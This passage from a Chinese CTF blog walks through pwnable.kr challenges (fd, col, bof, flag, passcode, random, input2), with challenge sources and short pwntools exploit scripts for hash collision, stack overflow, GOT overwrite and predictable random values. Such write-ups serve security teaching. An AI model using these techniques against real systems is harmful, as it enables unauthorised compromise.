        <span class="token class-name"><span class="token keyword">int</span></span> fd <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1234</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        len <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"LETMEWIN\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"good job :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"learn about Linux file IO\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>很简单的题目，根据源码可以知道fd&#x3D;0，就可以输入buf的值。然后再输入LETMEWIN\n便可以getflag。</p>
<p><img src="https://s2.loli.net/2024/08/19/isDPLCwoTe48OAB.png" alt="83648d3fd6384fb88615354345143865.png"></p>
<p>后面加的4660也就是0x1234。直接传入参数就完事了。</p>
<h5 id="第二题-col"><a href="#第二题-col" class="headerlink" title="第二题-col"></a>第二题-col</h5><p>查看源码</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
unsigned <span class="token class-name"><span class="token keyword">long</span></span> hashcode <span class="token operator">=</span> <span class="token number">0x21DD09EC</span><span class="token punctuation">;</span>
unsigned <span class="token return-type class-name"><span class="token keyword">long</span></span> <span class="token function">check_password</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">int</span><span class="token operator">*</span> ip <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> i<span class="token punctuation">;</span>
        <span class="token class-name"><span class="token keyword">int</span></span> res<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                res <span class="token operator">+=</span> ip<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> res<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>argc<span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"usage : %s [passcode]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"passcode length should be 20 bytes\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>hashcode <span class="token operator">==</span> <span class="token function">check_password</span><span class="token punctuation">(</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong passcode.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>可以看到关键就在于</p>
<p><img src="https://s2.loli.net/2024/08/19/gKUjRw3q7arYl2N.png" alt="cb2da2235ddf4e5a9177f98485d6b1ef.png"></p>
<p>简单分析一下check_password函数就可以知道，其实就是那五个数想加等于0x21DD09EC。</p>
<p><img src="https://s2.loli.net/2024/08/19/WbAUTRMVkhvqGJ9.png" alt="2ef31af7e9b64a0d88f7127e84cb3265.png"></p>
<p>但需要考虑，值不能超过20个字符啥的。也很简单，给他除以5除不尽。剩下的分一下就行。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x6c5cec8</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x6c5cecc</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> io<span class="token punctuation">.</span>process<span class="token punctuation">(</span>executable<span class="token operator">=</span><span class="token string">'./col'</span><span class="token punctuation">,</span> argv<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'col'</span><span class="token punctuation">,</span>pl<span class="token punctuation">]</span><span class="token punctuation">)</span>
    flag <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>

    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"FLag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://s2.loli.net/2024/08/19/3dRYWCZe28mvbAt.png" alt="359e2df755334f9bbaddb212cdd6c455.png"></p>
<h5 id="第三题-bof"><a href="#第三题-bof" class="headerlink" title="第三题-bof"></a>第三题-bof</h5><p>这题才算（个人认为）pwn题吧。</p>
<p><img src="https://s2.loli.net/2024/08/19/5tGJDdARaiqYQcB.png" alt="1beb011fd8b641138ae60567f683d1b8.png"></p>
<p>下载附件，查看很简单。一看就是栈溢出。</p>
<p><img src="https://s2.loli.net/2024/08/19/HXj5rK4OzeS6UPm.png" alt="2f314d69943d44d9a1f5e804c460f358.png"></p>
<p>动态调试一下，offset是多少吧。</p>
<p>可以看到第一个参数的位置是在这里的，0xffffcfc0</p>
<p><img src="https://s2.loli.net/2024/08/19/hWY34KanDViP9Ue.png" alt="9a1273b66e7d494896a8b9682650743b.png"></p>
<p>可以看到overflowme是从0xffffcf8c开始的。所以可以得到offset&#x3D;0x34</p>
<p><img src="https://s2.loli.net/2024/08/19/sxJAaOK4Ck1ygcF.png" alt="ea556c8726294a509627aa908398b94d.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> cyclic<span class="token punctuation">(</span><span class="token number">0x34</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xcafebabe</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>
    
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>

io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>getshell</p>
<p><img src="https://s2.loli.net/2024/08/19/yd1EoBMsJXTmeSN.png" alt="5d25c24e045f4a06b4c8fe1ada29544d.png"></p>
<h5 id="第四题-flag"><a href="#第四题-flag" class="headerlink" title="第四题-flag"></a>第四题-flag</h5><p>他自己都说是逆向题。</p>
<p><img src="https://s2.loli.net/2024/08/19/iOEhHsZGjzyn5Yc.png" alt="bf7aacc5ccf940e6a71dd8f7638faa0b.png"></p>
<p>直接查壳，发现是upx。直接脱壳</p>
<p><img src="https://s2.loli.net/2024/08/19/YeI1uxrAz9mq2gj.png" alt="8ffaf447d6db43619c0ac134338cd6b1.png"></p>
<p>再放进ida里面查看字符表，直接找到flag</p>
<p><img src="https://s2.loli.net/2024/08/19/GuamLliMN1eFbXs.png" alt="11a5595bab7d4cfea915b0b3604880ea.png"></p>
<h5 id="第五题-passcode"><a href="#第五题-passcode" class="headerlink" title="第五题-passcode"></a>第五题-passcode</h5><p>直接放进ida里面，发现漏洞。这个两个应该使用的是地址而不是变量，类似于fmt。所以想着覆盖吧。前面输入了一次name，可以溢出</p>
<p><img src="https://s2.loli.net/2024/08/19/IwGVJaFrHug4Z1q.png" alt="293990855fe749eca3462bb172e66b08.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/w1fqcxjIt5Meb2Q.png" alt="aec6d96651944a22a4232176709a3148.png"></p>
<p>通过动态调试可以看到</p>
<p><img src="https://s2.loli.net/2024/08/19/PjtXU3HzvQD1lpZ.png" alt="f697be6f80284d2d852d4985c084f3d9.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/jwzVZySel6KFWOb.png" alt="f8f8b0dc992e417fa6d2f43bbb0314f8.png"></p>
<p>发现name和v1的offset&#x3D;0x60。检查保护，可以改got表</p>
<p><img src="https://s2.loli.net/2024/08/19/LBwdu45JltjFXMI.png" alt="5fb7020aa5ea4521ac5e921877bba7a3.png"></p>
<p>接下来就是正常的直接把printfgot表改掉就行了。</p>
<p><img src="https://s2.loli.net/2024/08/19/xh6wRdY2zEKcpNL.png" alt="d4212d26f99241318e370d9f980a68c0.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    pl <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">96</span><span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x804A000</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>pl<span class="token punctuation">)</span>

    hack <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">0x80485e3</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>hack<span class="token punctuation">)</span>
    flag <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>

    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># io.close()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="第六题-random"><a href="#第六题-random" class="headerlink" title="第六题-random"></a>第六题-random</h5><p>随机数，这个没给种子，但默认是0或者1，直接gdb调试看看第一次值是多少就好啦</p>
<p><img src="https://s2.loli.net/2024/08/19/VHgJEbBOsex1iPG.png" alt="9441dcb76a9c4ad5998193956e9c38c0.png"></p>
<p><img src="https://s2.loli.net/2024/08/19/1zAo9YicUZNjPDp.png" alt="3fa4e5e27aba46c387451f6d5b5f1b1f.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> 
    
    v5 <span class="token operator">=</span> <span class="token number">0x6b8b4567</span>
    v4 <span class="token operator">=</span> v5<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">0xDEADBEEF</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    flag <span class="token operator">=</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"flag+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># io.close()</span>
exp<span class="token punctuation">(</span><span class="token punctuation">)</span>


io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h5 id="第七题-input2"><a href="#第七题-input2" class="headerlink" title="第七题-input2"></a>第七题-input2</h5><p>这题感觉就是过滤+网络编程，只能说有点难度，网上很多解释我这里不多说</p>
<pre class="line-numbers language-csharp" data-language="csharp"><code class="language-csharp"><span class="token preprocessor property">#include &lt;stdio.h></span>
<span class="token preprocessor property">#include &lt;stdlib.h></span>
<span class="token preprocessor property">#include &lt;string.h></span>
<span class="token preprocessor property">#include &lt;sys/socket.h></span>
<span class="token preprocessor property">#include &lt;arpa/inet.h></span>

<span class="token return-type class-name"><span class="token keyword">int</span></span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">int</span></span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to pwnable.kr\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's see if you know how to give input to program\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Just give me correct inputs then you will get the flag :)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// argv</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'A'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'B'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"\x20\x0a\x0d"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 1 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

  <span class="token comment">// stdio</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x00\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x0a\x02\xff"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 2 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  
  <span class="token comment">// env</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token string">"\xca\xfe\xba\xbe"</span><span class="token punctuation">,</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 3 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// file</span>
  FILE<span class="token operator">*</span> fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>fp<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">fread</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">1</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\x00\x00\x00\x00"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 4 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	

  <span class="token comment">// network</span>
  <span class="token class-name"><span class="token keyword">int</span></span> sd<span class="token punctuation">,</span> cd<span class="token punctuation">;</span>
  <span class="token keyword">struct</span> <span class="token class-name">sockaddr_in</span> saddr<span class="token punctuation">,</span> caddr<span class="token punctuation">;</span>
  sd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span> SOCK_STREAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>sd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"socket error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  saddr<span class="token punctuation">.</span>sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
  saddr<span class="token punctuation">.</span>sin_addr<span class="token punctuation">.</span>s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>
  saddr<span class="token punctuation">.</span>sin_port <span class="token operator">=</span> <span class="token function">htons</span><span class="token punctuation">(</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token char">'C'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>saddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name">saddr</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bind error, use another port\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    		<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">listen</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name"><span class="token keyword">int</span></span> c <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token type-expression class-name"><span class="token keyword">struct</span> sockaddr_in</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  cd <span class="token operator">=</span> <span class="token function">accept</span><span class="token punctuation">(</span>sd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>caddr<span class="token punctuation">,</span> <span class="token punctuation">(</span>socklen_t<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>cd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"accept error, tell admin\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token function">recv</span><span class="token punctuation">(</span>cd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">memcmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"\xde\xad\xbe\xef"</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Stage 5 clear!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// here's your flag</span>
  <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/cat flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>就一步步慢慢过就行，但是我当时遇到个问题，就是他本地不可以创建文件，就很烦。然后看了看网上的文章说可以上传到&#x2F;tmp目录，但是呢！！！没找到人怎么上传，所以我在这里声明一下，省去读者查找，前面是本地需要上传的文件，后面是上传到服务器的路径。（shell我自己创建的目录）</p>
<p><img src="https://s2.loli.net/2024/08/19/rIwHJ79c2pME1SO.png" alt="d6d1ccde997745838b92ee2b64382feb.png"></p>
<p>最后gcc编译一下，再软链接一下就好了。打过pwn.college的人应该知道。</p>
